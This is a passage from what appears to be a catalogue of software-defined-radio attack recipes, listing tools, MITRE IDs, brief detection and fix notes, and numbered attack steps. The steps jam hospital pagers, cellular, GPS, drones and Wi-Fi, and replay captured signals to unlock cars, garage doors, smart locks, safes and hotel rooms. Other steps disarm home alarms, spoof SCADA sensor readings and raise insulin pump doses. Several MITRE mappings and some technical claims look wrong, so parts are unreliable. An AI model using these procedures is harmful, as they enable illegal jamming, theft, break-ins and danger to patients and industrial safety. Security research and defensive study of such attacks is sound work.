- **Attack Steps**: Step 1: Identify pager frequency (e.g., 931.0 MHz used in hospital pagers). Step 2: Build a jamming signal using SDRSharp and HackRF. Step 3: Transmit low-power wideband noise centered at 931 MHz. Step 4: Simulate pager unresponsiveness to control alert delivery. Step 5: Stop jamming and restore functionality.
- **Detection**: RF monitoring and alert systems
- **Solution**: Migrate to secure, encrypted comms
- **Tags**: SDR, Pagers, Healthcare

## Jam Car Key Fob Signals

- **Attack Type**: Key Fob Jamming
- **Target**: Keyless entry cars
- **Vulnerability**: No channel hopping or authentication in fob signals
- **MITRE**: T1498
- **Impact**: Keyless entry fails
- **Tools**: HackRF One, Universal Radio Hacker (URH)
- **Scenario**: Deny lock/unlock signals from car remote fobs (315 MHz or 433 MHz) using SDR
- **Attack Steps**: Step 1: Identify key fob frequency (check manual or scan using URH). Step 2: Use URH to observe and capture fob signal spectrum. Step 3: Generate continuous interference in that frequency band. Step 4: Press fob button while jammer is active — door doesn’t unlock. Step 5: Stop jamming — fob works again.
- **Detection**: Spectrum tools, Car alert systems
- **Solution**: Rolling-code fobs, signal filtering
- **Tags**: Automotive, SDR, RF Jam

## Multi-Channel Wi-Fi Jamming Attack

- **Attack Type**: Broadband RF Denial
- **Target**: Wi-Fi APs and Clients
- **Vulnerability**: Lack of spread-spectrum resilience
- **MITRE**: T1498.001
- **Impact**: Multi-network outage
- **Tools**: HackRF One, GNU Radio, Python
- **Scenario**: Launch a wideband jamming attack that covers multiple Wi-Fi channels simultaneously (2.4 GHz)
- **Attack Steps**: Step 1: Use GNU Radio Companion to create a flowgraph with wideband noise (e.g., 20–30 MHz wide). Step 2: Set frequency range to span 2.412 to 2.472 GHz (covering Ch.1 to Ch.13). Step 3: Transmit signal continuously via HackRF One. Step 4: All devices across multiple Wi-Fi channels lose signal. Step 5: Observe reconnection once attack stops.
- **Detection**: Wireless IDS, RF interference logs
- **Solution**: Dynamic frequency selection, jamming detection
- **Tags**: Wideband Jamming, GNU Radio

## Smart Selective Wi-Fi Deauth Jammer

- **Attack Type**: Targeted DoS
- **Target**: Wi-Fi Clients
- **Vulnerability**: Lack of DoS protection per-client
- **MITRE**: T1498.001
- **Impact**: Targeted disconnection
- **Tools**: HackRF One, Python, Scapy, GNU Radio
- **Scenario**: A smart jamming attack that only targets active clients and leaves others unaffected
- **Attack Steps**: Step 1: Identify active Wi-Fi clients via airodump-ng scanning.Step 2: Note down MAC addresses of clients and AP.Step 3: Create a GNU Radio flowgraph to jam only specific narrow frequencies (e.g., 2.437 GHz).Step 4: Simultaneously send continuous deauth packets using Scapy in a Python script.Step 5: While jamming is active, specific client is disconnected, others remain unaffected.Step 6: Monitor with Wireshark or airodump-ng for impact.
- **Detection**: Wireshark, Airodump-ng, WIDS
- **Solution**: Per-client anomaly detection, MAC rotation
- **Tags**: Deauth, Scapy, Selective Jam

## FM Radio Station Interference

- **Attack Type**: Broadcast Signal DoS
- **Target**: FM Radio Receivers
- **Vulnerability**: No encryption/authentication on analog radio
- **MITRE**: T1498
- **Impact**: Loss of FM signal reception
- **Tools**: HackRF One, GNU Radio, SDRSharp
- **Scenario**: Simulate radio jamming of an FM station (e.g., 100.1 MHz) within a local area
- **Attack Steps**: Step 1: Build a narrowband jamming signal in GNU Radio at 100.1 MHz.Step 2: Transmit with very low gain to simulate interference.Step 3: Use a nearby FM radio to observe static/noise overriding station.Step 4: Stop jamming to confirm restoration.Step 5: Log observations and test on nearby FM bands.
- **Detection**: FM receiver comparison, RF spectrum scan
- **Solution**: Notch filtering, digital migration
- **Tags**: FM, Radio Jam, SDRSharp

## Zigbee IoT Jamming Attack

- **Attack Type**: Protocol-Specific RF Jamming
- **Target**: Zigbee-based IoT Devices
- **Vulnerability**: Narrowband RF communication without integrity checks
- **MITRE**: T1498.001
- **Impact**: Smart home control outage
- **Tools**: HackRF One, Zigbee sniffer (e.g., CC2531), GNU Radio
- **Scenario**: Disrupt Zigbee smart home devices by flooding their spectrum with noise
- **Attack Steps**: Step 1: Use CC2531 USB sniffer and Wireshark to identify Zigbee channel (e.g., Ch.15 at 2.425 GHz).Step 2: Build a jamming signal in GNU Radio matching Zigbee frequency.Step 3: Transmit signal continuously with HackRF One.Step 4: Observe smart bulbs/switches become unresponsive.Step 5: Stop jamming and verify devices auto-recover.Step 6: Document device behavior during jamming.
- **Detection**: Zigbee analyzer, automation logs
- **Solution**: RF redundancy, frequency agility
- **Tags**: Zigbee, IoT, Smart Home

## Remote Control Toy Jam

- **Attack Type**: RF Jam on ISM Band
- **Target**: RC Toys, Drones
- **Vulnerability**: No signal authentication, basic analog control
- **MITRE**: T1498
- **Impact**: Loss of control, potential physical crash
- **Tools**: HackRF One, SDRSharp
- **Scenario**: Disrupt toy drones/RC cars that operate on 27/49/72 MHz or 2.4 GHz bands
- **Attack Steps**: Step 1: Determine operating frequency (from manual or signal sniffing).Step 2: Create narrowband jamming tone at that frequency.Step 3: Transmit signal while toy is being operated.Step 4: Observe loss of control or erratic movement.Step 5: Stop jammer and confirm control is restored.
- **Detection**: SDR spectrum analysis, RF monitor
- **Solution**: Encrypted RC links, signal hopping
- **Tags**: RC, Drone, Toy Jam

## GSM 2G Downlink Jamming

- **Attack Type**: Cell Tower DoS
- **Target**: Mobile Phones (2G only)
- **Vulnerability**: No physical-layer integrity checks
- **MITRE**: T1498
- **Impact**: Call drop, SMS failure
- **Tools**: HackRF One, OpenBTS, SDRSharp
- **Scenario**: Jam 2G GSM downlink frequency (e.g., 935-960 MHz) to cause mobile signal loss
- **Attack Steps**: Step 1: Use SDRSharp to scan for GSM tower downlink frequencies.Step 2: Choose a known active GSM carrier (e.g., 939.8 MHz).Step 3: Build wideband noise signal and transmit via HackRF.Step 4: Observe target phone loses signal and goes to “No Service.”Step 5: Cease jamming and signal resumes.Step 6: Repeat with other carrier bands for comparison.
- **Detection**: Mobile signal strength tools, cell sniffer
- **Solution**: Force 4G-only mode, baseband filtering
- **Tags**: GSM, Mobile DoS, SDR

## GPS Jamming in Vehicle

- **Attack Type**: Navigation Denial
- **Target**: GPS Receivers
- **Vulnerability**: Low-power signal, easily drowned
- **MITRE**: T1498
- **Impact**: Navigation errors, route loss
- **Tools**: HackRF One, GPS-SDR-SIM
- **Scenario**: Block GPS receivers in vehicles using 1.57542 GHz L1 jamming
- **Attack Steps**: Step 1: Use GPS-SDR-SIM to generate fake or noisy GPS signal.Step 2: Transmit at 1.57542 GHz using HackRF.Step 3: GPS navigation on phone or car will show “No Signal.”Step 4: Move vehicle to simulate real-world impact (i.e., no location updates).Step 5: Stop signal and observe immediate GPS lock recovery.
- **Detection**: GPS monitoring apps, RF detection
- **Solution**: Directional antennas, signal validation
- **Tags**: GPS, Vehicle, DoS

## Wireless Doorbell Jam

- **Attack Type**: Consumer RF DoS
- **Target**: Wireless Doorbells
- **Vulnerability**: No redundancy, weak protocol
- **MITRE**: T1498
- **Impact**: Missed guest/alert
- **Tools**: HackRF One, RF toy remote
- **Scenario**: Jam 433 MHz doorbell signal to prevent chime from activating
- **Attack Steps**: Step 1: Press doorbell while sniffing spectrum using SDRSharp.Step 2: Identify burst frequency (~433 MHz).Step 3: Transmit a narrow tone at that frequency when doorbell is pressed.Step 4: Bell doesn’t ring due to interference.Step 5: Stop jammer and retest — works again.
- **Detection**: Manual testing, spectrum monitoring
- **Solution**: Use wired models, encryption
- **Tags**: 433 MHz, Consumer RF

## Garage Door Jam Simulation

- **Attack Type**: Jam + Delay
- **Target**: Garage Door RF Units
- **Vulnerability**: Signal is short-lived and unauthenticated
- **MITRE**: T1498
- **Impact**: Access denial
- **Tools**: HackRF One, SDRSharp
- **Scenario**: Prevent opening/closing by jamming signal at 390/433 MHz
- **Attack Steps**: Step 1: Monitor garage remote with SDRSharp during button press.Step 2: Identify frequency and capture pattern.Step 3: Transmit short jamming burst to overlap signal.Step 4: Door doesn’t respond to button.Step 5: Repeat to show selective interference (partial jam).
- **Detection**: Physical testing, spectrum logs
- **Solution**: Rolling-code remotes, retries
- **Tags**: Garage RF, SDR

## SDR-Based Baby Monitor DoS

- **Attack Type**: Privacy Disruption
- **Target**: Wireless Baby Monitors
- **Vulnerability**: Analog signals, no auth or encryption
- **MITRE**: T1498
- **Impact**: Loss of audio monitoring
- **Tools**: HackRF One, GNU Radio
- **Scenario**: Disrupt baby monitors operating at 900 MHz or 2.4 GHz
- **Attack Steps**: Step 1: Identify baby monitor frequency using manual or scanning.Step 2: Build narrowband jamming signal to overlap.Step 3: Transmit signal while monitoring receiver audio.Step 4: Audio becomes static or silent.Step 5: Stop signal — clear audio resumes.
- **Detection**: Parent unit logs, RF analysis
- **Solution**: Use digital encrypted models
- **Tags**: Baby Monitor, RF Jam

## Remote Meter Jamming (AMI)

- **Attack Type**: Utility Denial
- **Target**: Smart Utility Meters
- **Vulnerability**: Low signal power, bursty & short
- **MITRE**: T1498
- **Impact**: Usage data denial, billing issues
- **Tools**: HackRF One, GNU Radio
- **Scenario**: Simulate jamming of smart meters using RF backhaul (900 MHz ISM)
- **Attack Steps**: Step 1: Scan for utility meter signals at 900 MHz ISM band.Step 2: Identify burst timing of meter transmission.Step 3: Time a jamming signal to overlap transmission window.Step 4: Observe failure in reading or report.Step 5: Stop jamming to confirm normal behavior resumes.
- **Detection**: Meter logs, missing data alerts
- **Solution**: Stronger modulations, FEC
- **Tags**: Utility, AMI, SDR Jam

## Protocol-Aware Zigbee Beacon Jamming

- **Attack Type**: Targeted DoS
- **Target**: Zigbee Mesh Devices
- **Vulnerability**: Time-predictable beacons, no PHY-level authentication
- **MITRE**: T1498
- **Impact**: Temporary mesh collapse
- **Tools**: HackRF One, GNU Radio, Wireshark, CC2531 Sniffer
- **Scenario**: Exploit Zigbee beacon timing to jam only during transmission bursts, minimizing detection
- **Attack Steps**: Step 1: Plug in CC2531 Zigbee USB Sniffer and open Wireshark.Step 2: Start capturing Zigbee traffic and identify the beacon signal interval (usually every 15–30 seconds).Step 3: Note the channel (e.g., Channel 15 → 2.425 GHz) and approximate beacon burst duration (e.g., 80ms).Step 4: In GNU Radio, create a jammer script that transmits white noise only during the 80ms beacon time window.Step 5: Trigger the jammer in sync with beacon intervals and observe Zigbee devices dropping off the network.Step 6: Stop jammer and watch as devices rejoin after a delay.
- **Detection**: Zigbee analyzer, node communication logs
- **Solution**: Beacon randomization, channel agility
- **Tags**: Zigbee, Beacon Jam, Time-Sync Attack

## Frequency Hopping Spread Spectrum (FHSS) Exploit

- **Attack Type**: Adaptive Jamming
- **Target**: Bluetooth FHSS Devices
- **Vulnerability**: FHSS systems vulnerable to reactive jamming
- **MITRE**: T1498.001
- **Impact**: Device lag, packet loss, disconnections
- **Tools**: HackRF One, GNU Radio, Bluetooth Sniffer
- **Scenario**: Attempt to jam FHSS devices (like some Bluetooth versions) using reactive jamming with SDR
- **Attack Steps**: Step 1: Identify a FHSS device such as a Bluetooth headset or mouse.Step 2: Use a Bluetooth sniffer or Ubertooth One to visualize hopping patterns.Step 3: In GNU Radio, build a reactive jamming flow that listens for a signal and blasts noise immediately when a burst is detected.Step 4: Configure HackRF to hop across channels in sync with target device.Step 5: Observe increased latency, disconnection, or freezing on the Bluetooth device.Step 6: Stop jamming and confirm normal operation returns.
- **Detection**: Bluetooth debug logs, latency spikes
- **Solution**: Spread-resilient modulations, time jitter
- **Tags**: Bluetooth, FHSS, Reactive Jam

## Smartwatch Signal Disruption

- **Attack Type**: Targeted Wearable DoS
- **Target**: Smartwatches (BLE)
- **Vulnerability**: BLE doesn't encrypt or validate PHY-layer transmissions
- **MITRE**: T1498
- **Impact**: Sync failure, app disruption
- **Tools**: HackRF One, nRF Sniffer, GNU Radio
- **Scenario**: Simulate RF jamming that disrupts smartwatch-to-phone Bluetooth LE connection
- **Attack Steps**: Step 1: Connect smartwatch (BLE) to smartphone and monitor data sync.Step 2: Use nRF Sniffer dongle with Wireshark to find the BLE frequency (e.g., 2.402–2.480 GHz).Step 3: Identify which channel is used most frequently (BLE uses 40 channels).Step 4: In GNU Radio, build a jamming signal to overlap with top BLE channels used by that watch.Step 5: Transmit continuous or burst noise using HackRF.Step 6: Watch app on phone shows sync failure or smartwatch loses connectivity.Step 7: Disable jamming — connection restores.
- **Detection**: App connectivity logs, BLE packet sniffers
- **Solution**: BLE channel hopping, frequency offsetting
- **Tags**: BLE, Smartwatch, Low-Energy Jam

## LTE Band Partial Jamming

- **Attack Type**: Mobile Network DoS
- **Target**: LTE Smartphones
- **Vulnerability**: LTE uplink can be locally jammed if unencrypted
- **MITRE**: T1498
- **Impact**: Signal degradation, data delay
- **Tools**: HackRF One, SDRSharp, LTE Cell Scanner
- **Scenario**: Jam a narrow slice of LTE spectrum (e.g., Band 3 uplink) to simulate partial service degradation
- **Attack Steps**: Step 1: Use LTE Cell Scanner app to determine LTE Band in use (e.g., Band 3 uplink: 1710–1785 MHz).Step 2: In SDRSharp, visually locate the active band and signal peaks.Step 3: Build a narrowband jamming signal (~1 MHz wide) using GNU Radio, focused just below center of uplink band.Step 4: Transmit via HackRF for a few seconds.Step 5: Observe mobile device call quality drop or delayed SMS.Step 6: Disable jammer and service stabilizes.Note: Use shielding or Faraday cage to prevent real-world interference.
- **Detection**: LTE signal strength tools, cell logs
- **Solution**: Force 4G/5G bands, baseband jamming protection
- **Tags**: LTE, Narrow Jam, Band-Specific DoS

## Time-Scheduled Drone Jam

- **Attack Type**: Burst-Based Targeted Jam
- **Target**: Consumer Drones
- **Vulnerability**: Drones rely on periodic clean signals
- **MITRE**: T1498
- **Impact**: Emergency behavior (hover or return)
- **Tools**: HackRF One, GQRX, GNU Radio
- **Scenario**: Disrupt commercial drones at specific telemetry bursts to simulate fail-safe trigger
- **Attack Steps**: Step 1: Power on the drone and control it using its dedicated app/controller.Step 2: Use GQRX to monitor drone control signal spectrum (commonly 2.4 GHz ISM band).Step 3: Identify telemetry update bursts (e.g., every 500ms).Step 4: Build GNU Radio jammer to only transmit during these bursts for 100ms.Step 5: Activate jammer while drone is in air — it should initiate hover/return-to-home due to signal loss.Step 6: Stop jamming and verify normal reconnection.Step 7: Repeat and note how short bursts can trigger emergency modes without constant jamming.
- **Detection**: Drone telemetry logs, RF replay
- **Solution**: Redundant channels, encrypted telemetry
- **Tags**: Drone, Telemetry Jam, Timed DoS

## Reverse Engineering Smart Lock RF Protocol

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Smart Lock
- **Vulnerability**: Proprietary RF Protocol lacks encryption
- **MITRE**: T1420
- **Impact**: Unauthorized Access
- **Tools**: HackRF One, SDR#, Universal Radio Hacker (URH)
- **Scenario**: Attacker captures and decodes the RF signals of a wireless smart lock, replicating the unlock sequence.
- **Attack Steps**: Step 1: Power on HackRF One and open SDR#. Step 2: Set center frequency to match the smart lock’s RF band (e.g., 433 MHz). Step 3: Press the unlock button on the original remote while recording. Step 4: Analyze signal in URH, identify packet structure. Step 5: Replay the signal using HackRF or convert to Python script to emulate unlock command.
- **Detection**: Monitoring RF activity around sensitive devices
- **Solution**: Implement encryption, rolling codes
- **Tags**: SDR, Smart Lock, RF, URH, HackRF

## Intercepting Wireless Garage Door Opener Protocol

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Garage Door Receiver
- **Vulnerability**: Fixed code signal vulnerable to replay
- **MITRE**: T1557.003
- **Impact**: Physical Security Bypass
- **Tools**: RTL-SDR, GQRX, Inspectrum, URH
- **Scenario**: Attack emulates the RF signal from a garage door opener to gain unauthorized entry.
- **Attack Steps**: Step 1: Tune RTL-SDR to 315 MHz using GQRX. Step 2: Record signal when garage remote is pressed. Step 3: Analyze waveform in Inspectrum to understand symbol timing. Step 4: Use URH to reverse-engineer packet layout. Step 5: Replay captured signal using HackRF or create script.
- **Detection**: RF signal anomalies, logs
- **Solution**: Upgrade to rolling code remotes
- **Tags**: RF, Replay Attack, Garage, RTL-SDR

## Reversing Keyless Entry for Vehicles

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Vehicle Keyless Entry System
- **Vulnerability**: Fixed code or poorly obfuscated proprietary RF
- **MITRE**: T1430
- **Impact**: Vehicle Theft
- **Tools**: HackRF One, URH, GNURadio
- **Scenario**: Reverse engineering the unencrypted RF communication between a key fob and a car.
- **Attack Steps**: Step 1: Use HackRF One to capture signal when key fob is pressed near car. Step 2: Import the capture into URH. Step 3: Identify patterns, protocol structure, and bit sequences. Step 4: Replay signal in proximity to the car. Step 5: Observe if car unlocks, confirming vulnerability.
- **Detection**: Vehicle system logs, forensics
- **Solution**: Implement rolling code, shielded receivers
- **Tags**: Key Fob, Vehicle Hacking, SDR

## Decoding Industrial Remote Controls

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Industrial RF Remote
- **Vulnerability**: Proprietary protocol lacks obfuscation
- **MITRE**: T0851
- **Impact**: Machinery Manipulation
- **Tools**: HackRF One, URH, Audacity
- **Scenario**: Reverse engineering RF controls used in cranes or other industrial equipment.
- **Attack Steps**: Step 1: Tune HackRF to appropriate industrial RF band (e.g., 418 MHz). Step 2: Record control signals when operator presses lift/lower buttons. Step 3: Analyze binary representation using URH. Step 4: Map which packets correspond to which actions. Step 5: Recreate commands to simulate control in a test system.
- **Detection**: Spectrum analysis logs, manual audit
- **Solution**: Adopt encrypted and authenticated RF
- **Tags**: Crane, SDR, RF Controls, Industrial

## Decoding and Replaying Smart Toy Commands

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Smart Toy (Drone/Car)
- **Vulnerability**: Lack of authentication in command reception
- **MITRE**: T1203
- **Impact**: Toy Hijacking, Parental Concern
- **Tools**: HackRF One, URH, Audacity
- **Scenario**: Attack records and decodes RF signals from a smart toy (e.g., drone, talking toy) to inject unauthorized commands.
- **Attack Steps**: Step 1: Use HackRF to capture RF signal from smart toy remote. Step 2: Save IQ recording and load into URH. Step 3: Analyze binary protocol for patterns (e.g., move forward, turn). Step 4: Create mapping of command patterns. Step 5: Replay crafted binary command to toy using HackRF or GNURadio.
- **Detection**: Abnormal movements or noise from toy
- **Solution**: Use BLE with pairing/authentication
- **Tags**: RF Toy, Replay, SDR, HackRF

## Reverse Engineering Weather Station Protocol

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Weather Sensor Receiver
- **Vulnerability**: Unencrypted and undocumented RF format
- **MITRE**: T1421
- **Impact**: Misinformation / Sensor Spoof
- **Tools**: RTL-SDR, GQRX, URH
- **Scenario**: The attacker captures unencrypted RF data from a consumer weather station to extract temperature and humidity info.
- **Attack Steps**: Step 1: Plug RTL-SDR into laptop and open GQRX.Step 2: Tune to common weather station bands (e.g., 433.92 MHz).Step 3: Wait for periodic transmissions from the sensor.Step 4: Record signal and export IQ file.Step 5: Load into URH to analyze binary packet structure.Step 6: Match bits to temperature/humidity values seen on display.Step 7: Simulate signal to inject fake readings.
- **Detection**: Anomalous values, checksum errors
- **Solution**: Encrypt and verify sensor data
- **Tags**: IoT, SDR, Weather Sensor, RF

## Cloning Keyless Entry for Hotel Doors

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Hotel Door System
- **Vulnerability**: Weak RF/NFC protocol, no encryption/auth
- **MITRE**: T1078
- **Impact**: Unauthorized Room Entry
- **Tools**: HackRF One, URH
- **Scenario**: Attacker captures and replays keycard-like RF signal to gain unauthorized access to hotel rooms.
- **Attack Steps**: Step 1: Use HackRF One and set frequency around 125 kHz (LF RFID) or 13.56 MHz (HF RFID).Step 2: Bring HackRF near hotel door while guest taps keycard.Step 3: Record interaction as IQ data.Step 4: Use URH to analyze waveform and detect bit sequences.Step 5: Reverse engineer format; identify unique code.Step 6: Replay using HackRF or emulate using NFC tools.Step 7: Confirm access to room is granted.
- **Detection**: Logs or unexpected access patterns
- **Solution**: Use secure RFID with auth, detect cloning
- **Tags**: RFID, Keycard Cloning, HackRF

## Reverse Engineering Smart Meter Protocols

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Smart Utility Meter
- **Vulnerability**: Unauthenticated broadcast of sensitive data
- **MITRE**: T1209
- **Impact**: Tampering with Meter Data
- **Tools**: HackRF One, URH, Audacity
- **Scenario**: Capturing smart meter transmissions to decode power consumption and billing data.
- **Attack Steps**: Step 1: Use HackRF to capture 900 MHz ISM band transmissions from smart meter.Step 2: Record signal during active transmission.Step 3: Load into URH and convert waveform to bitstream.Step 4: Identify periodic frames and extract consumption values.Step 5: Modify data to simulate altered usage (e.g., lower usage).Step 6: Replay modified signal to receiver or analyzer.Step 7: Observe if false values are accepted.
- **Detection**: Power audit, meter diagnostics
- **Solution**: Use encrypted metering with signatures
- **Tags**: Smart Meter, SDR, Utility Hacking

## Decoding Drone Telemetry and Control Signals

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Consumer Drone
- **Vulnerability**: RF protocol unencrypted and unauthenticated
- **MITRE**: T1648
- **Impact**: Drone Hijacking, Surveillance
- **Tools**: HackRF, GQRX, URH
- **Scenario**: Attacker decodes telemetry and remote commands to understand and hijack drone operations.
- **Attack Steps**: Step 1: Power HackRF and scan for drone control frequencies (2.4GHz).Step 2: Record during takeoff, maneuvering.Step 3: Use URH to analyze structure of control packets.Step 4: Identify throttle, yaw, GPS, and camera control values.Step 5: Recreate packet with modified data (e.g., spoof location).Step 6: Replay to drone in controlled space to observe effects.Step 7: Optionally simulate GPS spoof alongside.
- **Detection**: Telemetry mismatch, geofence alerts
- **Solution**: Use secure pairing, encrypted RF links
- **Tags**: Drone, UAV, SDR, GNURadio

## Reverse Engineering RF Alarm System Protocol

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Home Alarm System
- **Vulnerability**: Fixed RF codes or predictable patterns
- **MITRE**: T1001
- **Impact**: Disarm Security System
- **Tools**: HackRF One, URH
- **Scenario**: Attacker decodes home alarm system RF protocol to disarm the system.
- **Attack Steps**: Step 1: Identify the frequency used by the alarm remote (usually 315/433 MHz).Step 2: Use HackRF to record signal when user arms/disarms system.Step 3: Import into URH and identify bitstream.Step 4: Observe if same signal is replayed for same button.Step 5: Recreate or replay signal to test if system disarms.Step 6: Log response of system after each replay.Step 7: Evaluate if authentication or rolling code is present.
- **Detection**: Check alarm logs, RF burst monitors
- **Solution**: Use secure RF chipsets with rolling codes
- **Tags**: Alarm, SDR, RF Exploit

## Spoofing Industrial Sensor Data in SCADA

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: SCADA Wireless Sensor
- **Vulnerability**: Lack of validation for incoming data
- **MITRE**: T0887
- **Impact**: Industrial Misinformation
- **Tools**: HackRF One, URH, GNURadio
- **Scenario**: Attack captures RF signals from a SCADA sensor and injects false readings.
- **Attack Steps**: Step 1: Identify sensor frequency (e.g., 868 MHz or 915 MHz).Step 2: Capture RF data from sensor using HackRF.Step 3: Analyze bitstream using URH.Step 4: Modify payload to simulate extreme temperature/pressure.Step 5: Replay using GNURadio or HackRF.Step 6: Observe system response (e.g., alarms triggered).Step 7: Log and interpret telemetry anomalies.
- **Detection**: Sensor log correlation, checksum errors
- **Solution**: Secure communication with CRC/auth
- **Tags**: SCADA, Sensor Spoofing, SDR

## Breaking RF-based Medical Device Communication

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Wireless Medical Device (Simulated)
- **Vulnerability**: Unencrypted/proprietary protocol
- **MITRE**: T1496
- **Impact**: Patient Safety Risk
- **Tools**: HackRF, URH, GNURadio
- **Scenario**: Capturing wireless commands to/from medical insulin pump.
- **Attack Steps**: Step 1: Use HackRF to tune to ~400 MHz (common for RF medical devices).Step 2: Record signal during interaction between controller and pump.Step 3: Analyze with URH to understand command format.Step 4: Modify command to increase dosage.Step 5: Replay in test simulator (never on real device).Step 6: Watch for simulator response to ensure safety.Step 7: Document ethical boundaries.
- **Detection**: Medical device alert logs
- **Solution**: Encrypt commands and pair devices securely
- **Tags**: Medical, SDR, Ethical Hacking

## Reversing Keyless Smart Safe Access Protocol

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Smart Safe
- **Vulnerability**: Static RF key, no authentication
- **MITRE**: T1552.004
- **Impact**: Unauthorized Safe Access
- **Tools**: HackRF One, URH
- **Scenario**: Attackers decode RF signals used in opening a consumer smart safe.
- **Attack Steps**: Step 1: Identify smart safe's control frequency (e.g., 433 MHz).Step 2: Capture open/close signals.Step 3: Load into URH and visualize signal structure.Step 4: Match signals to button presses or actions.Step 5: Replay signal to attempt safe opening.Step 6: Validate replay success and log result.Step 7: Attempt brute-force RF payload simulation.
- **Detection**: Physical logs, access monitoring
- **Solution**: Secure hardware modules, NFC auth
- **Tags**: Safe, SDR, RF Replay

## Decoding Bike Lock Wireless Signal

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Smart Bike Lock
- **Vulnerability**: Static signal / open BLE pairing
- **MITRE**: T1556.003
- **Impact**: Physical Asset Theft
- **Tools**: HackRF, URH, BLE sniffers (if BLE), GQRX
- **Scenario**: Capturing unlock command sent to smart Bluetooth-enabled or RF bike lock.
- **Attack Steps**: Step 1: Determine if lock uses RF or BLE.Step 2: If RF, capture with HackRF on common bands (433/315 MHz).Step 3: If BLE, use BLE sniffer (e.g., Ubertooth).Step 4: Analyze packet structure and unlock command.Step 5: Replay via HackRF or emulate with BLE tools.Step 6: Unlock device remotely in controlled lab.Step 7: Document vulnerability.
- **Detection**: Signal detection, BLE logs
- **Solution**: Require BLE pairing with auth key
- **Tags**: BLE, Bike Lock, RF, SDR

## Reverse Engineering NFC Protocol in Payment Toys

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: NFC Smart Toy
- **Vulnerability**: Weak authentication, static UID
- **MITRE**: T1550.002
- **Impact**: NFC Cloning / Unauthorized Use
- **Tools**: Proxmark3, URH
- **Scenario**: Attack captures and clones NFC commands from payment-enabled smart toys.
- **Attack Steps**: Step 1: Use Proxmark3 to scan and log toy’s NFC tag.Step 2: Dump data and analyze tag structure.Step 3: Identify communication sequence and command set.Step 4: Replay the NFC dump in a payment terminal simulator.Step 5: Observe acceptance or rejection of spoofed tag.Step 6: Modify content and retry spoofing.Step 7: Validate vulnerability and log data.
- **Detection**: Monitor transaction logs, NFC scans
- **Solution**: Secure element usage, disable static UIDs
- **Tags**: NFC, Toy Cloning, SDR

## Reverse Engineering Smart Light RF Protocol

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Smart Lighting System
- **Vulnerability**: No encryption, uses static RF commands
- **MITRE**: T1557
- **Impact**: Unauthorized Smart Device Control
- **Tools**: HackRF One, URH, GQRX
- **Scenario**: Attacker captures RF signals from a remote-controlled smart light to replicate the ON/OFF signal without physical access to the remote.
- **Attack Steps**: Step 1: Plug HackRF into your laptop and launch GQRX (a spectrum visualizer).Step 2: Press buttons on the smart light’s remote (ON, OFF, brightness) and observe the spectrum for activity (commonly at 433.92 MHz).Step 3: Record the RF activity during remote button presses using GQRX or command line.Step 4: Import the IQ recording into Universal Radio Hacker (URH).Step 5: Use the "Signal Analysis" tab to decode the binary waveform into patterns for ON, OFF, and brightness levels.Step 6: Identify repetitive sequences or headers that define each function.Step 7: Replay the ON signal using HackRF in a controlled lab and observe the light turning on.Step 8: Document your replay file and RF fingerprint for future simulations.
- **Detection**: RF anomaly logs, unexpected device activity
- **Solution**: Use secure protocols like Zigbee with pairing
- **Tags**: SmartHome, RF, Replay, SDR

## Reverse Engineering Wireless Doorbell Signals

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Wireless Doorbell
- **Vulnerability**: Static RF Code
- **MITRE**: T0816
- **Impact**: Noise/Harassment, False Alerts
- **Tools**: RTL-SDR, Audacity, Inspectrum, URH
- **Scenario**: Capturing and cloning RF transmissions from a wireless doorbell to prank or trigger false alerts.
- **Attack Steps**: Step 1: Connect RTL-SDR dongle to your laptop and launch GQRX.Step 2: Press the wireless doorbell button and locate the RF spike (usually 433 MHz band).Step 3: Record the RF waveform using GQRX or command-line tools.Step 4: Open the recorded file in Audacity or Inspectrum to visualize waveform characteristics and timings.Step 5: Import signal into URH to extract bitstream and protocol structure.Step 6: Decode the waveform and note the packet pattern that corresponds to a button press.Step 7: Replay the extracted bitstream using HackRF or generate a Python-based SDR transmitter.Step 8: When replayed, observe if the receiver activates the chime—proving successful cloning.Step 9: Try slight alterations in timing or payload to test device sensitivity.
- **Detection**: RF monitoring with timestamps
- **Solution**: Use encrypted RF modules or Zigbee
- **Tags**: IoT, SDR, Replay, Doorbell

## Reverse Engineering Toy Car Remote Control

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Toy RC Car
- **Vulnerability**: No authentication, static protocol
- **MITRE**: T1548
- **Impact**: Toy Hijacking, Educational Tool
- **Tools**: HackRF One, URH
- **Scenario**: Cloning a wireless signal from a toy car remote to hijack movement (forward, backward, left, right).
- **Attack Steps**: Step 1: Turn on the toy car and its remote controller.Step 2: Launch GQRX with HackRF and search for signal in the 27 MHz or 49 MHz bands (common for toys).Step 3: Press each directional control (e.g., forward) and record the signal one by one.Step 4: Save the waveform as an IQ file and open it in URH.Step 5: Use “Signal Analysis” to extract binary sequences for each direction.Step 6: Label each waveform clearly (e.g., forward.bit, reverse.bit).Step 7: Replay the “forward” signal using HackRF while pointing it at the toy.Step 8: Observe the toy move forward—verifying success.Step 9: Repeat for other directions and test combinations.Step 10: Package these signals into a simulated control interface for educational demo.
- **Detection**: No RF validation, no logs
- **Solution**: Use digital encryption with pairing
- **Tags**: SDR, RF, Toy, Remote Control

## Reverse Engineering Wireless Intercom Signal

- **Attack Type**: SDR > Proprietary Protocol Reverse Engineering
- **Target**: Wireless Intercom / Baby Monitor
- **Vulnerability**: Cleartext RF voice transmission
